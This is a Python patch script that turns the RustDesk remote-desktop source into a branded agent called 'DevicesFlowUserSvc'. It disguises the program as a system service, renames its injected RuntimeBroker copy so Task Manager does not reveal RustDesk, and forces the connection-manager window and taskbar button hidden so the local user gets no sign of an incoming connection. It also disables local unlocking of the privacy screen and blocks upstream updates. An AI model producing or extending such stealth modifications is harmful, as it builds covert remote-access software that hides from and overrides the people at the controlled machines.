#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DevicesFlowUserSvc 受控端 UI 补丁。

用法: python patch_agent_ui.py <rustdesk 源码根目录>

做三件事：
1. main.dart 补 import 并把首页 `? const DesktopTabPage()` 换成 `? const AgentPage()`
   （整个窗口变成 250x148 的 ID + 修改访问密码小窗）；
2. 关掉 runMainApp 里的自动更新检查（agent 版不接受上游更新推送）；
3. main.cpp 窗口标题常量 L"RustDesk" -> L"DevicesFlowUserSvc"
   （上游硬编码，workflow 的 appname sed 不覆盖此文件）。
"""

import os
import re
import sys

BRAND = 'DevicesFlowUserSvc'
IMPORT_LINE = "import 'package:flutter_hbb/desktop/pages/agent_page.dart';"
UNLOCK_WATCHER_MARK = 'hy_local_unlock_watcher'


def patch_main_dart(root):
    main_dart = os.path.join(root, 'flutter', 'lib', 'main.dart')
    if not os.path.isfile(main_dart):
        raise SystemExit('main.dart not found: %s' % main_dart)

    with open(main_dart, encoding='utf-8') as f:
        src = f.read()

    if IMPORT_LINE not in src:
        m = re.search(
            r"^import 'package:flutter_hbb/desktop/pages/desktop_tab_page\.dart';\s*$",
            src, re.M)
        if m:
            src = src[:m.end()] + '\n' + IMPORT_LINE + src[m.end():]
        else:
            idx = src.rfind('\nimport ')
            end = src.find('\n', idx + 1)
            src = src[:end + 1] + IMPORT_LINE + '\n' + src[end + 1:]

    if 'const AgentPage()' not in src:
        n = src.count('? const DesktopTabPage()')
        if n == 0:
            raise SystemExit('patch failed: DesktopTabPage call site not found')
        src = src.replace('? const DesktopTabPage()', '? const AgentPage()')

    # 关闭自动更新检查（runMainApp 内），agent 版只接受 MSI 静默重装升级
    src = src.replace('  checkUpdate();\n',
                      '  // agent build: auto update disabled\n',
                      1)

    with open(main_dart, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched main.dart (home -> AgentPage, checkUpdate disabled)')


def patch_main_cpp(root):
    main_cpp = os.path.join(root, 'flutter', 'windows', 'runner', 'main.cpp')
    if not os.path.isfile(main_cpp):
        raise SystemExit('main.cpp not found: %s' % main_cpp)

    with open(main_cpp, encoding='utf-8') as f:
        src = f.read()

    old = 'std::wstring app_name = L"RustDesk";'
    if old not in src:
        if 'L"%s"' % BRAND in src:
            print('main.cpp already branded')
            return
        raise SystemExit('patch failed: app_name anchor not found in main.cpp')
    src = src.replace(old, 'std::wstring app_name = L"%s";' % BRAND)

    with open(main_cpp, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched main.cpp window title -> %s' % BRAND)


def patch_broker_exe(root):
    """隐私屏子进程改名：RuntimeBroker_rustdesk.exe -> RuntimeBroker_<brand>.exe。

    隐私屏开启时受控端把 System32\\RuntimeBroker.exe 复制一份并注入遮挡 DLL，
    复制品名带 rustdesk 会在任务管理器穿帮，改成品牌名。
    """
    p = os.path.join(root, 'src', 'privacy_mode', 'win_topmost_window.rs')
    if not os.path.isfile(p):
        raise SystemExit('win_topmost_window.rs not found: %s' % p)

    with open(p, encoding='utf-8') as f:
        src = f.read()

    old = 'RuntimeBroker_rustdesk.exe'
    new = 'RuntimeBroker_%s.exe' % BRAND.lower()
    if old not in src:
        if new in src:
            print('broker exe already renamed')
            return
        raise SystemExit('patch failed: broker exe name anchor not found')
    src = src.replace(old, new)

    with open(p, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched privacy broker exe -> %s' % new)


def patch_privacy_local_unlock(root):
    """本地解锁已整体禁用（2026-11-10）：隐私屏只能由管理端远程解除。

    1. 遮挡窗口 DLL（privacy_dllmain.cpp）的 Ctrl+P 键盘钩子与
       GetAsyncKeyState 轮询由 HY_ENABLE_LOCAL_UNLOCK=0 编译开关关闭；
    2. 这里不再向 win_topmost_window.rs 注入 flag 文件监听——
       %ProgramData%\\DevicesFlowUserSvc\\privacy_unlock.flag 任何本地
       用户都能手工创建，保留监听等于给「本地解锁」留后门；
    3. 上游 turn_off_privacy 仍由管理端远程调用（关闭隐私模式/断开连接），
       不受影响。
    """
    print('skip privacy local unlock: disabled by design')


def patch_cm_hide(root):
    """受控端连接时不弹任何提示窗口：连接管理器（CM）窗口强制隐藏。

    上游逻辑：CM 进程启动时读 cm 配置 hide_cm == 'true' 才隐藏；但设置界面
    里写这个配置的开关已被上游注释掉，实际永远 false → 每次有人连上来，
    受控端右下角都弹出「连接管理器」窗口（用户报「受控端连接出现提示窗口」）。
    这里在 agent 构建里强制隐藏：
      1. main.dart runConnectionManagerScreen：hide 恒为 true；
      2. server_model.dart：hideCm 字段默认 true（timerCallback / 客户端
         状态更新里所有 showCmWindow 都被 !hideCm 守卫，一并关死）。
    """
    # 1) main.dart
    p = os.path.join(root, 'flutter', 'lib', 'main.dart')
    if not os.path.isfile(p):
        raise SystemExit('main.dart not found: %s' % p)
    with open(p, encoding='utf-8') as f:
        src = f.read()

    if 'agent 隐身：连接管理器窗口永不显示' not in src:
        anchor = ("  final hide = await bind.cmGetConfig(name: \"hide_cm\")"
                  " == 'true';\n"
                  "  gFFI.serverModel.hideCm = hide;\n")
        if anchor not in src:
            raise SystemExit('patch failed: cm hide anchor not found in main.dart')
        new = ("  // 【HyDesk】agent 隐身：连接管理器窗口永不显示（连接无任何提示）。\n"
               "  // 上游 hide_cm 配置的设置入口已被注释，恒为 false，这里直接强制。\n"
               "  // 另：CM 窗口也永不进任务栏（被连接时任务栏不出现任何按钮）。\n"
               "  final hide = true;\n"
               "  gFFI.serverModel.hideCm = hide;\n"
               "  try {\n"
               "    await windowManager.setSkipTaskbar(true);\n"
               "  } catch (_) {}\n")
        src = src.replace(anchor, new, 1)
        with open(p, 'w', encoding='utf-8', newline='\n') as f:
            f.write(src)
        print('patched main.dart: CM window never shown')
    else:
        print('main.dart CM hide already patched')

    # 2) server_model.dart
    p2 = os.path.join(root, 'flutter', 'lib', 'models', 'server_model.dart')
    if not os.path.isfile(p2):
        print('skip cm hide: server_model.dart not found')
        return
    with open(p2, encoding='utf-8') as f:
        src = f.read()

    if 'agent 隐身：CM 窗口默认隐藏' not in src:
        anchor = '  bool hideCm = false;\n'
        if anchor not in src:
            raise SystemExit('patch failed: hideCm anchor not found')
        src = src.replace(
            anchor,
            '  bool hideCm = true; // 【HyDesk】agent 隐身：CM 窗口默认隐藏\n',
            1)
        with open(p2, 'w', encoding='utf-8', newline='\n') as f:
            f.write(src)
        print('patched server_model.dart: hideCm defaults true')
    else:
        print('server_model.dart hideCm already patched')


def read(p):
    with open(p, encoding='utf-8-sig') as f:
        return f.read()


def write(p, src):
    with open(p, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)


def patch_agent_window_first_show(root):
    """agent 主窗口：安装/首次运行弹一次 ID 面板，其余一律隐藏且永不进任务栏。

    2026-11-10 19:15 用户报「受控端被连接后任务栏有提示」：
    上一版首启判断读 %LOCALAPPDATA%\\.ui_shown，但服务在用户会话拉起
    agent 进程时环境可能继承 SYSTEM/异账户的 LOCALAPPDATA，标记文件
    找不到 → 误判首次 → 窗口在任务栏冒出来（被连接/开机都可能出现）。

    2026-11-11 用户报「第一次安装还是无法显示软件界面」：只认安装器写的
    %ProgramData%\\.hy_show_id，一旦安装器那一步没跑到（用 MSI 直接装、
    安装器被安全软件拦、旧版安装包），就永远看不到 ID 面板。现在三个入口
    任意命中即弹：

      1. --hy-show-id 命令行参数（agent_setup.nsi 装完带参数拉起，最可靠）；
      2. %ProgramData%\\<Product>\\.hy_show_id 标记（30 分钟内有效，读到即删）；
      3. 本机首次运行（%ProgramData%\\<Product>\\.hy_ui_seen 不存在）——
         兜底覆盖「MSI 静默装 / 旧安装包 / 手工双击 exe」三种场景，弹过
         就落 .hy_ui_seen，之后开机自启、服务拉起、被连接都纯后台隐藏。

    弹窗时居中 + 临时置顶 20 秒（避免被浏览器/安装器窗口盖住看不到），
    并且无条件 setSkipTaskbar(true)，窗口永远不占任务栏。
    """
    p = os.path.join(root, 'flutter', 'lib', 'main.dart')
    src = read(p)
    mark = 'agent 首启：安装器标记/首次运行触发'
    if mark in src:
        print('main.dart agent window installer-marker already patched')
        return
    old = ('      windowManager.show();\n'
           '      windowManager.focus();\n'
           '      // Move registration of active main window here to prevent'
           ' from async visible check.\n')
    if old not in src:
        raise SystemExit('patch failed: runMainApp show anchor not found')
    new = ('      // 【HyDesk】' + mark + '\n'
           '      // 触发条件：--hy-show-id 参数 / 安装器 ProgramData 标记（30 分钟）/ 本机首次运行。\n'
           '      // 其余情况（服务拉起、开机、被连接）一律静默，窗口永不进任务栏。\n'
           '      windowManager.setSkipTaskbar(true);\n'
           '      var hyShowOnce = false;\n'
           '      String hyBase = \'C:\\\\ProgramData\';\n'
           '      try {\n'
           '        hyBase = Platform.environment[\'ProgramData\'] ??\n'
           '            Platform.environment[\'LOCALAPPDATA\'] ??\n'
           '            \'C:\\\\ProgramData\';\n'
           '        final hyDir = Directory(\'$hyBase\\\\DevicesFlowUserSvc\');\n'
           '        final hyFlag = File(\'${hyDir.path}\\\\.hy_show_id\');\n'
           '        final hySeen = File(\'${hyDir.path}\\\\.hy_ui_seen\');\n'
           '        // 1) 命令行显式要求（安装器）\n'
           '        if (kBootArgs.contains(\'--hy-show-id\')) {\n'
           '          hyShowOnce = true;\n'
           '        }\n'
           '        // 2) 安装器写的限时标记\n'
           '        if (!hyShowOnce && hyFlag.existsSync()) {\n'
           '          hyShowOnce = DateTime.now()\n'
           '                  .difference(hyFlag.lastModifiedSync())\n'
           '                  .inMinutes <\n'
           '              30;\n'
           '        }\n'
           '        // 3) 本机首次运行兜底\n'
           '        if (!hyShowOnce && !hySeen.existsSync()) {\n'
           '          hyShowOnce = true;\n'
           '        }\n'
           '        if (hyShowOnce) {\n'
           '          try {\n'
           '            hyDir.createSync(recursive: true);\n'
           '            if (hyFlag.existsSync()) hyFlag.deleteSync();\n'
           '            hySeen.writeAsStringSync(\'1\');\n'
           '          } catch (_) {}\n'
           '        }\n'
           '      } catch (_) {}\n'
           '      if (hyShowOnce) {\n'
           '        windowManager.show();\n'
           '        windowManager.focus();\n'
           '        // 居中 + 临时置顶，防止被浏览器/安装器窗口盖住而「看不到界面」\n'
           '        windowManager.setAlignment(Alignment.center);\n'
           '        windowManager.setAlwaysOnTop(true);\n'
           '        Future.delayed(const Duration(seconds: 20), () {\n'
           '          try {\n'
           '            windowManager.setAlwaysOnTop(false);\n'
           '          } catch (_) {}\n'
           '        });\n'
           '      } else {\n'
           '        windowManager.hide();\n'
           '      }\n'
           '      // Move registration of active main window here to prevent'
           ' from async visible check.\n')
    src = src.replace(old, new, 1)
    # 兜底：标记文件依赖 dart:io 的 File/Platform/Directory
    if ("import 'dart:io';" not in src
            and 'import "dart:io";' not in src):
        imp = "import 'package:flutter/material.dart';"
        if imp in src:
            src = src.replace(imp, "import 'dart:io';\n\n" + imp, 1)
            print('main.dart: added dart:io import for install marker')
    write(p, src)
    print('patched main.dart: agent window shows on install/first run only')


def main():
    root = sys.argv[1] if len(sys.argv) > 1 else '.'
    if not os.path.isfile(os.path.join(root, 'flutter', 'lib', 'main.dart')):
        page = os.path.join(root, 'flutter', 'lib', 'desktop', 'pages',
                            'agent_page.dart')
        if not os.path.isfile(page):
            raise SystemExit('agent_page.dart not found: %s' % page)
    patch_main_dart(root)
    patch_main_cpp(root)
    patch_broker_exe(root)
    patch_privacy_local_unlock(root)
    patch_cm_hide(root)
    patch_agent_window_first_show(root)


if __name__ == '__main__':
    main()
